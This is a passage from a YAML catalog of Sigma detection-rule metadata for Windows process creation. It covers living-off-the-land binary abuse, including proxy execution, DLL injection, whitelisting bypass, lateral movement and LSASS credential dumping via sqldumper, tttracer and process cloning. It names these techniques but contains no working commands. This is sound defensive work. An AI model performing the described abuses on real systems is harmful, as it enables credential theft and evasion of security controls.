  - https://twitter.com/Oddvarmoe/status/993383596244258816
  - https://github.com/api0cradle/LOLBAS/blob/d148d278f5f205ce67cfaf49afdfb68071c7252a/OSScripts/pester.md
  false_positives:
  - Legitimate use of Pester for writing tests for Powershell scripts and modules
  notes: ''
- detection_id: cafeeba3-01da-4ab4-b6c4-a31b1d9730c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_printbrm.yml
  name: PrintBrm ZIP Creation of Extraction
  description: Detects the execution of the LOLBIN PrintBrm.exe, which can be used
    to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1564.004
  tags:
  - attack.command-and-control
  - attack.t1105
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1fb76ab8-fa60-4b01-bddd-71e89bf555da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml
  name: Pubprn.vbs Proxy Execution
  description: Detects the use of the 'Pubprn.vbs' Microsoft signed script to execute
    commands.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216.001
  tags:
  - attack.defense-evasion
  - attack.t1216.001
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Scripts/Pubprn/
  false_positives:
  - Unknown
  notes: ''
- detection_id: cd3d1298-eb3b-476c-ac67-12847de55813
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_rasautou_dll_execution.yml
  name: DLL Execution via Rasautou.exe
  description: Detects using Rasautou.exe for loading arbitrary .DLL specified in
    -d option and executes the export specified in -p.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Rasautou/
  - https://github.com/fireeye/DueDLLigence
  - https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1c8774a0-44d4-4db0-91f8-e792359c70bd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_register_app.yml
  name: REGISTER_APP.VBS Proxy Execution
  description: Detects the use of a Microsoft signed script 'REGISTER_APP.VBS' to
    register a VSS/VDS Provider as a COM+ application.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/sblmsrsn/status/1456613494783160325?s=20
  false_positives:
  - Legitimate usage of the script. Always investigate what's being registered to
    confirm if it's benign
  notes: ''
- detection_id: 4eddc365-79b4-43ff-a9d7-99422dc34b93
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml
  name: Use of Remote.exe
  description: Remote.exe is part of WinDbg in the Windows SDK and can be used for
    AWL bypass and running remote files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Remote/
  false_positives:
  - Approved installs of Windows SDK with Debugging Tools for Windows (WinDbg).
  notes: ''
- detection_id: 9292293b-8496-4715-9db6-37028dcda4b3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_replace.yml
  name: Replace.exe Usage
  description: Detects the use of Replace.exe which can be used to replace file with
    another file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Replace/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/replace
  false_positives:
  - Unknown
  notes: ''
- detection_id: cd71385d-fd9b-4691-9b98-2b1f7e508714
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_runexehelper.yml
  name: Lolbin Runexehelper Use As Proxy
  description: Detect usage of the "runexehelper.exe" binary as a proxy to launch
    other programs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1206692239839289344
  - https://lolbas-project.github.io/lolbas/Binaries/Runexehelper/
  false_positives:
  - Unknown
  notes: ''
- detection_id: eca49c87-8a75-4f13-9c73-a5a29e845f03
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_runscripthelper.yml
  name: Suspicious Runscripthelper.exe
  description: Detects execution of powershell scripts via Runscripthelper.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1202
  tags:
  - attack.execution
  - attack.t1059
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Runscripthelper/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 64760eef-87f7-4ed3-93fd-655668ea9420
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_scriptrunner.yml
  name: Use of Scriptrunner.exe
  description: The "ScriptRunner.exe" binary can be abused to proxy execution through
    it and bypass possible whitelisting
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/
  false_positives:
  - Legitimate use when App-v is deployed
  notes: ''
- detection_id: b2ddd389-f676-4ac4-845a-e00781a48e5f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_settingsynchost.yml
  name: Using SettingSyncHost.exe as LOLBin
  description: Detects using SettingSyncHost.exe to run hijacked binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1574.008
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.defense-evasion
  - attack.t1574.008
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2020/02/02/settingsynchost-exe-as-a-lolbin
  false_positives:
  - Unknown
  notes: ''
- detection_id: a85ffc3a-e8fd-4040-93bf-78aff284d801
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_sftp.yml
  name: Use Of The SFTP.EXE Binary As A LOLBIN
  description: Detects the usage of the "sftp.exe" binary as a LOLBIN by abusing the
    "-D" flag
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/pull/264
  false_positives:
  - Unknown
  notes: ''
- detection_id: a2ea3ae7-d3d0-40a0-a55c-25a45c87cac1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_susp_driver_installed_by_pnputil.yml
  name: Suspicious Driver Install by pnputil.exe
  description: Detects when a possible suspicious driver is being installed via pnputil.exe
    lolbin
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/pnputil-command-syntax
  - https://strontic.github.io/xcyclopedia/library/pnputil.exe-60EDC5E6BDBAEE441F2E3AEACD0340D2.html
  false_positives:
  - Pnputil.exe being used may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Pnputil.exe being executed from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: f14e169e-9978-4c69-acb3-1cff8200bc36
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_susp_grpconv.yml
  name: Suspicious GrpConv Execution
  description: Detects the suspicious execution of a utility to convert Windows 3.x
    .grp files or for persistence purposes by malicious software or actors
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1526833181831200770
  false_positives:
  - Unknown
  notes: ''
- detection_id: 23ceaf5c-b6f1-4a32-8559-f2ff734be516
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_susp_sqldumper_activity.yml
  name: Dumping Process via Sqldumper.exe
  description: Detects process dump via legitimate sqldumper.exe binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://twitter.com/countuponsec/status/910977826853068800
  - https://twitter.com/countuponsec/status/910969424215232518
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/
  false_positives:
  - Legitimate MSSQL Server actions
  notes: ''
- detection_id: fbd7c32d-db2a-4418-b92c-566eb8911133
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml
  name: SyncAppvPublishingServer Execute Arbitrary PowerShell Code
  description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md
  - https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/
  false_positives:
  - App-V clients
  notes: ''
- detection_id: 36475a7d-0f6d-4dce-9b01-6aeb473bbaf1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml
  name: SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code
  description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.t1216
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1216/T1216.md
  - https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 148431ce-4b70-403d-8525-fcc2993f29ea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_tracker.yml
  name: Potential DLL Injection Or Execution Using Tracker.exe
  description: Detects potential DLL injection and execution using "Tracker.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055.001
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055.001
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b27077d6-23e6-45d2-81a0-e2b356eea5fd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_ttdinject.yml
  name: Use of TTDInject.exe
  description: Detects the executiob of TTDInject.exe, which is used by Windows 10
    v1809 and newer to debug time travel (underlying call of tttracer.exe)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 0b4ae027-2a2d-4b93-8c7e-962caaba5b2a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_tttracer_mod_load.yml
  name: Time Travel Debugging Utility Usage
  description: Detects usage of Time Travel Debugging Utility. Adversaries can execute
    malicious processes and dump processes, such as lsass.exe, via tttracer.exe.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1218
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1218
  - attack.t1003.001
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Tttracer/
  - https://twitter.com/mattifestation/status/1196390321783025666
  - https://twitter.com/oulusoyum/status/1191329746069655553
  false_positives:
  - Legitimate usage by software developers/testers
  notes: ''
- detection_id: 727454c0-d851-48b0-8b89-385611ab0704
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_unregmp2.yml
  name: Lolbin Unregmp2.exe Use As Proxy
  description: Detect usage of the "unregmp2.exe" binary as a proxy to launch a custom
    version of "wmpnscfg.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Unregmp2/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0403d67d-6227-4ea8-8145-4e72db7da120
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_utilityfunctions.yml
  name: UtilityFunctions.ps1 Proxy Dll
  description: Detects the use of a Microsoft signed script executing a managed DLL
    with PowerShell.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216
  tags:
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Scripts/UtilityFunctions/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7b10f171-7f04-47c7-9fa2-5be43c76e535
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_visual_basic_compiler.yml
  name: Visual Basic Command Line Compiler Usage
  description: Detects successful code compilation via Visual Basic Command Line Compiler
    that utilizes Windows Resource to Object Converter.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027.004
  tags:
  - attack.defense-evasion
  - attack.t1027.004
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Vbc/
  false_positives:
  - Utilization of this tool should not be seen in enterprise environment
  notes: ''
- detection_id: b30a8bc5-e21b-4ca2-9420-0a94019ac56a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_visualuiaverifynative.yml
  name: Use of VisualUiaVerifyNative.exe
  description: VisualUiaVerifyNative.exe is a Windows SDK that can be used for AWL
    bypass and is listed in Microsoft's recommended block rules.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/VisualUiaVerifyNative/
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac
  - https://bohops.com/2020/10/15/exploring-the-wdac-microsoft-recommended-block-rules-visualuiaverifynative/
  - https://github.com/MicrosoftDocs/windows-itpro-docs/commit/937db704b9148e9cee7c7010cad4d00ce9c4fdad
  false_positives:
  - Legitimate testing of Microsoft UI parts.
  notes: ''
- detection_id: 18749301-f1c5-4efc-a4c3-276ff1f5b6f8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_vsiisexelauncher.yml
  name: Use of VSIISExeLauncher.exe
  description: The "VSIISExeLauncher.exe" binary part of the Visual Studio/VS Code
    can be used to execute arbitrary binaries
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/VSIISExeLauncher/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 49be8799-7b4d-4fda-ad23-cafbefdebbc5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_wfc.yml
  name: Use of Wfc.exe
  description: The Workflow Command-line Compiler can be used for AWL bypass and is
    listed in Microsoft's recommended block rules.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wfc/
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac
  false_positives:
  - Legitimate use by a software developer
  notes: ''
- detection_id: 28c8f68b-098d-45af-8d43-8089f3e35403
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolscript_register_app.yml
  name: Potential Register_App.Vbs LOLScript Abuse
  description: Detects potential abuse of the "register_app.vbs" script that is part
    of the Windows SDK. The script offers the capability to register new VSS/VDS Provider
    as a COM+ application. Attackers can use this to install malicious DLLs for persistence
    and execution.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/sblmsrsn/status/1456613494783160325?s=20
  - https://github.com/microsoft/Windows-classic-samples/blob/7cbd99ac1d2b4a0beffbaba29ea63d024ceff700/Samples/Win7Samples/winbase/vss/vsssampleprovider/register_app.vbs
  false_positives:
  - Other VB scripts that leverage the same starting command line flags
  notes: ''
- detection_id: c8da0dfd-4ed0-4b68-962d-13c9c884384e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lsass_process_clone.yml
  name: Potential Credential Dumping Via LSASS Process Clone
  description: Detects a suspicious LSASS process process clone that could be a sign
    of credential dumping activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003
  - attack.t1003.001
  time_window: ''
  references:
  - https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/
  - https://twitter.com/Hexacorn/status/1420053502554951689
  - https://twitter.com/SBousseaden/status/1464566846594691073?s=20
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3d48c9d3-1aa6-418d-98d3-8fd3c01a564e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mftrace_child_process.yml
  name: Potential Mftrace.EXE Abuse
  description: Detects child processes of the "Trace log generation tool for Media
    Foundation Tools" (Mftrace.exe) which can abused to execute arbitrary binaries.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Mftrace/
  false_positives:
  - Legitimate use for tracing purposes
  notes: ''
- detection_id: dcff7e85-d01f-4eb5-badd-84e2e6be8294
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mmc_default_domain_gpo_modification_via_gpme.yml
  name: Windows Default Domain GPO Modification via GPME
  description: 'Detects the use of the Group Policy Management Editor (GPME) to modify
    Default Domain or Default Domain Controllers Group Policy Objects (GPOs).

    Adversaries may leverage GPME to make stealthy changes in these default GPOs to
    deploy malicious GPOs configurations across the domain without raising suspicion.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1484.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1484.001
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/25/i/unmasking-the-gentlemen-ransomware.html
  - https://adsecurity.org/?p=3377
  - https://sdmsoftware.com/general-stuff/launching-the-new-gp-management-editor-from-the-command-line/
  - https://www.pentestpartners.com/security-blog/living-off-the-land-gpo-style/
  false_positives:
  - Legitimate use of GPME to modify GPOs
  notes: ''
- detection_id: f1f3bf22-deb2-418d-8cce-e1a45e46a5bd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mmc_mmc20_lateral_movement.yml
  name: MMC20 Lateral Movement
  description: Detects MMC20.Application Lateral Movement; specifically looks for
    the spawning of the parent MMC.exe with a command line of "-Embedding" as a child
    of svchost.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.003
  tags:
  - attack.execution
  - attack.lateral-movement
  - attack.t1021.003
  time_window: ''
  references:
  - https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
  - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view?usp=sharing
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9cfe4b27-1e56-48b4-b7a8-d46851c91a44
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mmc_rlo_abuse_pattern.yml
  name: MMC Executing Files with Reversed Extensions Using RTLO Abuse
  description: Detects malicious behavior where the MMC utility (`mmc.exe`) executes
    files with reversed extensions caused by Right-to-Left Override (RLO) abuse, disguising
    them as document formats.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1036.002
  - T1204.002
  - T1218.014
  tags:
  - attack.execution
  - attack.t1204.002
  - attack.defense-evasion
  - attack.t1218.014
  - attack.t1036.002
  time_window: ''
  references:
  - https://www.unicode.org/versions/Unicode5.2.0/ch02.pdf
  - https://en.wikipedia.org/wiki/Right-to-left_override
  - https://tria.ge/241015-l98snsyeje/behavioral2
  false_positives:
  - Legitimate administrative actions using MMC to execute misnamed `.msc` files.
  - Unconventional but non-malicious usage of RLO or reversed extensions.
  notes: ''
- detection_id: 05a2ab7e-ce11-4b63-86db-ab32e763e11d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mmc_susp_child_process.yml
  name: MMC Spawning Windows Shell
  description: Detects a Windows command line executable started from MMC
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.003
  tags:
  - attack.lateral-movement
  - attack.t1021.003
  time_window: ''
  references:
  - https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
  false_positives: []
  notes: ''
- detection_id: 12fbff88-16b5-4b42-9754-cd001a789fb3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mode_codepage_russian.yml
  name: CodePage Modification Via MODE.COM To Russian Language
  description: 'Detects a CodePage modification using the "mode.com" utility to Russian
    language.

    This behavior has been used by threat actors behind Dharma ransomware.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/intl/code-page-identifiers
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mode
